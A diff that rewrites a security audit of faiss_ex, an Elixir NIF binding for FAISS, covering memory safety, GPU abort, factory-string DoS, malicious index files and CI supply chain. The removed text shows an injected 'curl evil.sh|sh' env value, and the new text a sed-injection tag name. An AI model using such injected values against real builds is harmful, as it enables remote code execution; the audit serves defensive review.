@@ -1,121 +1,116 @@
-# Security Audit: faiss_ex (native NIF + supply chain)
+# Security Audit: faiss_ex (a397362, v0.3.2, FAISS v1.15.1)
 
-## Executive Summary
+Scope: `c_src/faiss_ex_nif.c` (primary), `lib/faiss_ex/*.ex`, `Makefile`, `mix.exs`,
+`.github/workflows/{ci,publish}.yml`. Upstream behaviour was checked against the
+cached FAISS v1.15.1 tree at `~/.cache/faiss_ex/faiss-v1.15.1/` (cited as `faiss/…`).
+Not applicable here (no web layer): auth, sessions, CSRF, XSS, SQL, LiveView authz.
+`sobelow` was not run because it is not a dependency and has nothing to scan in a NIF library.
 
-This is a native-code C NIF binding for FAISS with no web/auth/session layer,
-so OWASP web categories do not apply. Audit focused on memory safety of
-`c_src/faiss_ex_nif.c`, the Elixir boundary, and the build supply chain.
+## Score: 74/100
 
-**The C NIF layer is exemplary**: every size product goes through overflow-safe
-`safe_mul`, every binary size is validated against claimed `n * dim` before the
-pointer reaches FAISS, all allocation failures are handled, error paths release
-locks and binaries, interior-NUL strings are rejected, no dynamic atoms, no
-format strings, and resource destructors are guarded against double-free. No
-memory-safety bug was found in the NIF.
+How the rubric was adapted (the Phoenix criteria become their NIF-library equivalents).
+Per-finding deductions: Critical −15, Medium −5, Low −2. Each category has a floor of 0.
 
-The real weaknesses are in the **build supply chain**: FAISS is pulled from a
-**mutable git tag with no commit-SHA pin or checksum verification**.
+| Criterion (pts) | Findings | Deduction | Score |
+|---|---|---|---|
+| Critical memory-safety bugs (30) | none | 0 | 30 |
+| High/Medium NIF issues (20) | N1 GPU negative device → `abort()` (M), N2 untrusted factory string → VM DoS (M), N5 unaligned binary pointers (L) | −5 −5 −2 | 8 |
+| Lock / resource lifetime (15) | none | 0 | 15 |
+| Atom exhaustion (10) | none | 0 | 10 |
+| Untrusted-input deserialization (10) | N3 `from_file/2` on an untrusted file → arbitrary-path read-write mmap (M) | −5 | 5 |
+| Supply chain / secrets (15) | N4 actions pinned to mutable tags in the job that holds the secret (M), P2 unquoted Makefile env interpolation (L, still open), N6 workflow hardening (L) | −5 −2 −2 | 6 |
+| **Total** | | | **74** |
 
-**Security health score: 85/100** — memory-safe, lock-disciplined native code;
-points deducted for an unpinned/unverified upstream source fetch (supply chain)
-and build-time shell-interpolation of env vars.
+The previous score was 85. No code regressed. The drop comes from new findings: the
+earlier audit did not trace the GPU device path, factory-string parsing, or on-disk
+inverted lists into FAISS.
 
-## Findings
+Clean areas, one line: every `enif_get_*` and `enif_inspect_binary` return value is
+checked. Every size product goes through `safe_mul`, and binary sizes are validated
+against the cached `res->dim` before the lock. Lock unwinding is correct: there is no
+return path that still holds a lock, and the two functions that must validate locked
+state each use a single `unlock:` label (`c_src/faiss_ex_nif.c:923-925`, `:969-970`).
+Dirty-scheduler placement matches CLAUDE.md. Destructors NULL their pointers, and
+resources stay alive through `argv` for the length of each call. GPU index lifetime is
+safe: `GpuIndex` holds a `shared_ptr` to the impl
+(`faiss/gpu/StandardGpuResources.h:204,265`; `faiss/gpu/GpuIndex.cu:63`), so freeing
+the `GpuResources` resource first cannot cause a use-after-free. Only 4 static atoms
+are created (`:1000-1005`). The Elixir layer has no `String.to_atom`, `binary_to_term`,
+`System.cmd`, or `Code.eval`.
 
-### 1. FAISS pulled from mutable git tag, no SHA/checksum verification (Supply Chain)
-- **Severity**: Medium
-- **Location**: `Makefile:11,140`; `mix.exs:72`
-- **Issue**: `FAISS_GIT_REV ?= v1.14.3` is a **tag**, which is mutable. The build
-  does `git clone --depth 1 --branch v1.14.3 <repo>` and compiles whatever the
-  tag points to at build time. There is no commit-SHA pin and no verification of
-  the cloned tree against a known hash. Git tags can be force-moved on the remote,
-  and `--depth 1 --branch <tag>` will silently fetch the new target.
-- **Failure scenario**: If the `facebookresearch/faiss` `v1.14.3` tag is moved
-  (upstream compromise, or a maintainer re-tag), every fresh `mix compile`
-  (cache miss at `~/.cache/faiss_ex/`) compiles and links attacker-controlled C++
-  into the BEAM with zero warning. There is no integrity gate to detect the change.
-- **Fix**: Pin to an immutable commit SHA and verify it, e.g.:
-  ```make
-  FAISS_GIT_REV ?= <full-40-char-sha>
-  # after clone:
-  cd $(FAISS_SRC) && test "$$(git rev-parse HEAD)" = "$(FAISS_EXPECTED_SHA)"
-  ```
-  Clone without `--branch` on a shallow tag, then `git fetch --depth 1 origin <sha>`
-  and `git checkout <sha>`. Keep the human-readable tag only as a comment.
-- **OWASP**: A08:2021 Software and Data Integrity Failures.
+## Prior findings status
 
-### 2. Build-time shell interpolation of env vars (Supply Chain / defense-in-depth)
+| # | Prior finding | Status | Evidence |
+|---|---|---|---|
+| P1 | FAISS pulled from a mutable tag with no SHA check (Medium) | **RESOLVED** | `Makefile:15-21` pins `FAISS_GIT_SHA` for `v1.15.1`. `Makefile:163-172` fails closed: on mismatch it runs `rm -rf` and `exit 1`, and the `.cloned` stamp is never touched. `mix.exs:9-10,76-86` mirrors the pin. Residual gap: a custom `FAISS_GIT_REV`, or an explicitly empty `FAISS_GIT_SHA`, builds unverified without any warning (`Makefile:16-22`, `mix.exs:79`). Folded into P2's fix. |
+| P2 | Build-time shell interpolation of env vars (Low) | **STILL OPEN** | Expansions are still unquoted: `git clone --depth 1 --branch $(FAISS_GIT_REV) $(FAISS_GIT_REPO) $(FAISS_SRC)` at `Makefile:162`, `git -C $(FAISS_SRC)` at `:164`, `rm -rf $(FAISS_SRC)` at `:169`, `cp $(SYSTEM_LIB_DIR)/…` at `:134,142`. `FAISS_SRC` is built from `$(HOME)` and the env-controlled `FAISS_GIT_REV` (`:27-28`). |
+| P3 | Unbounded result allocation from caller `n`/`k` (Low/info) | **STILL OPEN (accepted)** | `c_src/faiss_ex_nif.c:398-412`: `safe_mul` plus a checked `enif_alloc_binary`, which is memory-safe. A huge `k` is still a caller-driven allocation. No change needed unless `k` comes from untrusted input. |
+| P4 | NIF trusts FAISS to bounds-check reconstruct keys (Low/info) | **RESOLVED** | The prior premise was wrong: negative keys were an out-of-bounds read, fixed in 1f82d4b. The NIF now rejects negative keys on every path: `keys_non_negative` at `:185-190`, used in reconstruct at `:522` and residuals at `:616`. It also rejects contiguous ranges whose end overflows int64 (`:542`). Tests cover the batched, per-key, binary and residual paths (`test/faiss_ex/index_test.exs:244-249,713-731`). Upper bounds are enforced by FAISS v1.15.1: `IndexFlat.cpp:285`, `IndexFlatCodes.cpp:79`, `invlists/DirectMap.cpp:75-76`, `IndexFastScan.cpp:619-621`, and `IndexIDMap.cpp:388+` (`rev_map` lookup). |
+
+## New findings
+
+### N1. A negative GPU device id aborts the whole BEAM (CUDA builds)
+- **Severity**: Medium (VM-wide DoS from a single bad argument; `USE_CUDA=true` builds only)
+- **Location**: `c_src/faiss_ex_nif.c:746-759` (`nif_index_cpu_to_gpu`); `lib/faiss_ex/index.ex:413-416` and `:178` (`Index.new(..., device: {:cuda, id})`)
+- **Evidence**: The NIF passes `device` from `enif_get_int` straight to `faiss_index_cpu_to_gpu` with no sign check. The Elixir clauses have no guard; `non_neg_integer()` exists only in the `@spec`. Inside FAISS:
+  - `GpuIndex::GpuIndex` checks only the upper bound, `config_.device < getNumDevices()` (`faiss/gpu/GpuIndex.cu:65-68`), so `-1` passes.
+  - `initializeForDevice` checks `FAISS_ASSERT(device < getNumDevices())` (`faiss/gpu/StandardGpuResources.cpp:342`), which `-1` also passes.
+  - `getDeviceProperties(-1)` then calls `CUDA_VERIFY(cudaGetDeviceProperties(&prop, device))` (`faiss/gpu/utils/DeviceUtils.cu:68`). That fails with an invalid-device error and reaches `FAISS_ASSERT_FMT` → `abort()` (`faiss/impl/FaissAssert.h:52-64`).
+  - The C API's catch-all cannot intercept `abort()`, so the node dies.
+- **Fix**: Reject the value in the NIF before any FAISS call: `if (device < 0) return make_error_msg(env, "device must be non-negative");` after `:749`. Also add `when is_integer(device_id) and device_id >= 0` to `cpu_to_gpu/2`, and add a `:cuda`-tagged test for `cpu_to_gpu(index, -1)`.
+
+### N2. `Index.new/3` docs invite untrusted factory strings, which can OOM or crash the VM from a normal scheduler
+- **Severity**: Medium (DoS)
+- **Location**: `lib/faiss_ex/index.ex:133-134` ("`dim` or `description` … routinely come from configuration or user input"); `c_src/faiss_ex_nif.c:237`; `:1028` (`nif_new_index` on a normal scheduler)
+- **Evidence**: The factory string controls allocation size at construction time, with no upper bound:
+  - `IVF<n>[kM]` sets `nlist` (`faiss/index_factory.cpp:291-292`). `parse_nlist` returns `std::stoi(s) * multiplier` (`:274`), and that `int` multiply overflows for `IVF3000M`.
+  - `IMI2x<nbit>` computes `nlist = (size_t)1 << (2 * nbit)` (`:300`), which is undefined behaviour for `nbit ≥ 32`, and builds a `MultiIndexQuantizer(d, 2, nbit)` with `2^nbit` centroids per sub-quantizer.
+  - Something like `"IVF100M,Flat"` makes the inverted lists value-initialise about 1e8 × 2 `std::vector` headers. With Linux overcommit that commits memory page by page, and the OOM killer can take the BEAM. This runs inside `nif_new_index`, which is registered on a **normal** scheduler (`:1028`). [INFERENCE: exact peak memory per factory string not measured]
+  - FAISS parses descriptions with `std::regex` (`index_factory.cpp:213` and others). libstdc++'s regex executor is recursive, so very long inputs are a known stack-exhaustion risk. [INFERENCE: not reproduced]
+- **Fix**: Remove "or user input" from the doc and state that `description` must be trusted or chosen from an allow-list. Defensively, cap `byte_size(description)` (for example 256) in `Index.new/3`, and move `nif_new_index` to `ERL_NIF_DIRTY_JOB_CPU_BOUND`, since construction can allocate gigabytes. Update CLAUDE.md's dirty-scheduler list to match.
+
+### N3. `from_file/2` on an untrusted index file can open and **write** to an arbitrary path chosen by the file
+- **Severity**: Medium (untrusted-input deserialization; matters for any app that loads uploaded or downloaded `.index` files)
+- **Location**: `lib/faiss_ex/index.ex:362-372` (`io_flags` defaults to `0`, and the doc gives no trust warning); `c_src/faiss_ex_nif.c:684`; README `:243-244` (no warning)
+- **Evidence**: FAISS registers `OnDiskInvertedListsIOHook` by default (`faiss/invlists/InvertedListsIOHook.cpp:37`). An IVF file with on-disk lists carries its own `filename` (`faiss/invlists/OnDiskInvertedLists.cpp:736-737`). With `io_flags = 0`, `read_only` is false (`:719`), so `do_mmap()` runs `fopen(filename, "r+")` and `mmap(..., PROT_READ|PROT_WRITE, MAP_SHARED, ...)` with a `totsize` taken from the file (`:270-283`, `:764-766`). Consequences:
+  - A crafted index makes the BEAM map any file the OS user can open read-write.
+  - `search`/`reconstruct` disclose that file's bytes as vector data.
+  - `add/2` writes attacker-shaped data into it.
+  - A `totsize` larger than the real file causes SIGBUS on access, which crashes the VM.
+  - FAISS v1.15.1 does validate many other fields on read (`faiss/impl/index_read.cpp:1757-1760`, `validate_HNSW` at `:1307`, the NSG range checks at `:1340-1360`). The on-disk filename is not one of them.
+- **Fix**: Add a "Security" note to `from_file/2` and the README: index files are trusted input, never load user-supplied files, and on-disk IVF indexes reference external paths. Optionally expose `:io_flags` symbolically and recommend `IO_FLAG_READ_ONLY` (16) for read-only use. That blocks the write primitive but not the read.
+
+### N4. GitHub Actions pinned to mutable tags in the job that holds `HEX_API_KEY`
+- **Severity**: Medium (supply chain)
+- **Location**: `.github/workflows/publish.yml:19,21,30` (`actions/checkout@v6`, `erlef/setup-beam@v1`, `actions/cache@v5`); `:79` (`HEX_API_KEY`). The same pattern appears throughout `ci.yml:23,25,51,58,76,78,90,92,100,106,139,141,166`.
+- **Evidence**: `HEX_API_KEY` is scoped to the final step, but earlier steps run third-party action code in the same job. A moved `erlef/setup-beam@v1` tag could swap the toolchain (`mix`/`erl`) on PATH, and the later `mix hex.publish` step would then run the attacker's binary with the key in its environment.
+- **Fix**: Pin every `uses:` to a full commit SHA, with the version in a comment (`erlef/setup-beam@<40-char-sha> # v1.x.y`), and let Dependabot (`package-ecosystem: github-actions`) bump them.
+
+### N5. Binary API hands possibly unaligned pointers to `float*`/`idx_t*` (undefined behaviour)
 - **Severity**: Low
-- **Location**: `Makefile:140` (`git clone ... $(FAISS_GIT_REV) $(FAISS_GIT_REPO)`),
-  and the `FAISS_PREFIX` `cp`/`install_name_tool` recipes (`Makefile:110-124`).
-- **Issue**: `FAISS_GIT_REV`, `FAISS_GIT_REPO`, and `FAISS_PREFIX` (all env-overridable
-  via `mix.exs` `make_env/0`) are interpolated unquoted into shell recipe lines. A
-  value containing shell metacharacters would execute during `mix compile`.
-- **Failure scenario**: `FAISS_GIT_REV='v1; curl evil.sh|sh' mix compile` runs
-  arbitrary commands. Requires an attacker who already controls the build
-  environment (env vars / CI config), so impact is limited — but a poisoned CI
-  variable or a copy-pasted build command turns into code execution.
-- **Fix**: Quote expansions (`"$(FAISS_GIT_REV)"`) and/or validate the values
-  match `^[A-Za-z0-9._/-]+$` before use. Prefer passing the repo/rev as fixed
-  literals rather than overridable env vars for release builds.
+- **Location**: `c_src/faiss_ex_nif.c:306,351-352,418,464,520-522,615-616,625,921`; exposed by the binary pass-through in `lib/faiss_ex/index.ex:455-466` (added in b5127f1)
+- **Evidence**: Before b5127f1, every input binary was freshly built from iodata. Now a caller binary passes through as-is (`encode_vector_data!/2` only checks `rem(byte_size, dim*4)`). A sub-binary such as `binary_part(body, 1, n)` or `<<_hdr::binary-size(3), rest::binary>>` is not copied by `enif_inspect_binary` when its bit offset is 0. Its `data` pointer can therefore sit at any byte offset, and the NIF dereferences it as `idx_t*` itself (`keys_non_negative`, `:186-187`, and the contiguity loop) before handing it to FAISS. On x86-64 and arm64, scalar and `loadu` accesses tolerate this. It is still undefined behaviour, and any aligned-SIMD path or alignment-assuming vectoriser would fault. [INFERENCE: no crash reproduced on current targets]
+- **Fix**: In the NIF, check `((uintptr_t)bin.data % _Alignof(float|int64_t)) != 0`, and when misaligned copy into an `enif_alloc` buffer (or reject). Alternatively, do the cheap check in Elixir and `:binary.copy/1` only when needed. Add a test using `binary_part/3` at offset 1.
 
-### 3. Unbounded result allocation from caller-controlled n / k (DoS)
-- **Severity**: Low (informational — memory-safe, not a crash)
-- **Location**: `nif_search_index` `c_src/faiss_ex_nif.c:361-378`; also
-  reconstruct/residuals result buffers.
-- **Issue**: Result binaries are sized `n * k * 8` (labels) + `n * k * 4`
-  (distances) from caller-supplied `n` and `k`. `safe_mul` prevents integer
-  overflow and `enif_alloc_binary` failure is handled gracefully, so there is no
-  memory-unsafety — but a single `search(index, huge_batch, huge_k)` can request
-  a very large allocation.
-- **Failure scenario**: A caller passing an enormous `k` triggers a large
-  transient allocation / allocation failure. In a library context the caller
-  controls its own inputs, so this is informational; document that `k` and batch
-  size should be bounded by callers exposing faiss_ex to untrusted input.
-- **Fix**: Optionally cap `n * k` (e.g. reject > configurable limit) if this
-  library is ever placed behind untrusted request input.
+### N6. Workflow hardening gaps
+- **Severity**: Low
+- **Location / Evidence**:
+  - `ci.yml` has no `permissions:` block (`ci.yml:1-14`), so `push` runs on `master` get the repository-default `GITHUB_TOKEN` scope, which can be write-all on older repos.
+  - `publish.yml:41-42` interpolates the tag name, unvalidated, into a GNU `sed` program. Git ref names may contain `/` and `;`, so a tag like `v1/;e<cmd>;#` becomes a `sed e` command. This requires tag-push rights. [INFERENCE: not executed]
+  - `publish.yml` has no `environment:` with required reviewers, so anyone who can push a `v*` tag can publish to Hex.
+- **Fix**:
+  - Add top-level `permissions: contents: read` to `ci.yml`.
+  - In `publish.yml`, validate first: `[[ "$TAG_VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$ ]] || exit 1`.
+  - Move the publish job into a protected `environment: hex` that holds `HEX_API_KEY`, and add a tag-protection rule for `v*`.
 
-### 4. NIF trusts FAISS to bounds-check reconstruct keys (informational)
-- **Severity**: Low (informational)
-- **Location**: `nif_reconstruct_batch` `c_src/faiss_ex_nif.c:485-524`.
-- **Issue**: `keys[]` values (including negative or out-of-range) are passed to
-  `faiss_Index_reconstruct[_n]` without a ntotal bounds check in the NIF. FAISS
-  1.14.3 validates (`FAISS_THROW_IF_NOT(i0 >= 0 && i0 + ni <= ntotal)`) and the
-  C API converts the throw to a non-zero return that the NIF handles, so this is
-  currently safe. It is a correctness dependency on upstream, not a live bug.
-- **Fix**: None required for 1.14.3. Re-verify the reconstruct bounds guards when
-  bumping `FAISS_GIT_REV` (same note as the thread-local `faiss_get_last_error`
-  assumption already documented at line 122).
+## Recommendations (priority order)
+1. N1: add a `device < 0` guard in the NIF and Elixir. This is a one-line fix for a VM `abort()`.
+2. N3 and N2: document that index files and factory strings are trusted input. Cap description length and move `nif_new_index` to a dirty scheduler.
+3. N4: pin actions by SHA, especially in `publish.yml`.
+4. P2 + P1 residual: quote every Makefile expansion (`"$(FAISS_SRC)"`, `"$(FAISS_GIT_REV)"`, `"$(FAISS_GIT_REPO)"`, `"$(SYSTEM_LIB_DIR)"`), validate `FAISS_GIT_REV` against `^[A-Za-z0-9._/-]+$`, and print a `$(warning …)` when `FAISS_GIT_SHA` is empty.
+5. N5, N6: alignment copy-or-reject; workflow permissions, tag validation, and a protected environment.
 
-## Clean areas (no issues found)
-- Integer overflow in size products: `safe_mul` used at every product; overflow
-  returns an error before allocation.
-- Binary size validation: every NIF checks `data_bin.size == expected` before
-  passing the pointer to FAISS.
-- Buffer over/under-read on binary slicing: sizes validated; `n==0` paths guard
-  empty binaries.
-- Use-after-free / double-free in destructors: destructors NULL out after free;
-  the GPU/wrap error paths do not double-free (verified `nif_index_cpu_to_gpu`).
-- Resource-vs-destructor race: resources are NIF call arguments, so the BEAM keeps
-  them alive for the call duration; rwlock discipline (write for mutate, read for
-  query; fixed two-lock order in `nif_train_clustering`) is correct and all
-  lockable NIFs run on dirty schedulers.
-- Error paths leaking memory/locks: every early return after `rwlock`/`enif_alloc`
-  releases the lock and any allocated binary.
-- Format-string issues: none — `make_error_msg` uses `memcpy`+`strlen`, no `printf`
-  family with user data.
-- Atom exhaustion: only four fixed atoms created in `init_atoms`; no dynamic atoms.
-- Interior-NUL / path handling: `contains_nul` rejects embedded NULs in factory
-  strings and file paths before null-termination. Caller-controlled file paths are
-  expected for a library; no path-traversal bug to flag.
-- Elixir layer: no `String.to_atom`, no `:erlang.binary_to_term`, no `System.cmd`/
-  `Code.eval`/`apply` on external input (grep clean across `lib/`). Input is
-  encoded to f32/s64 binaries with per-row dimension validation in
-  `Shared.encode_vectors!` (raises `ArgumentError` on bad rows).
-
-## Tools to Recommend (run manually — this agent has no Bash access)
-- `mix deps.audit` / `mix hex.audit` — dependency advisories (deps are minimal:
-  `elixir_make`, `ex_doc`, `benchee`).
-- `sobelow` is Phoenix-oriented and will find little here; skip.
-- Consider `clang --analyze` / `scan-build` and an ASan build of the NIF against
-  a fuzz harness feeding malformed `n`/`dim`/binary combinations to each NIF.
+## Tools to recommend (run manually)
+- `mix hex.audit` (already clean). Add `mix_audit` as a `:dev` dep if `mix deps.audit` is wanted.
+- Build the NIF with `-fsanitize=address,undefined,alignment` and fuzz each NIF with malformed `n`/`k`/binary/sub-binary inputs. N5 would show up immediately.
+- `zizmor` or `actionlint` on `.github/workflows/` for N4 and N6.
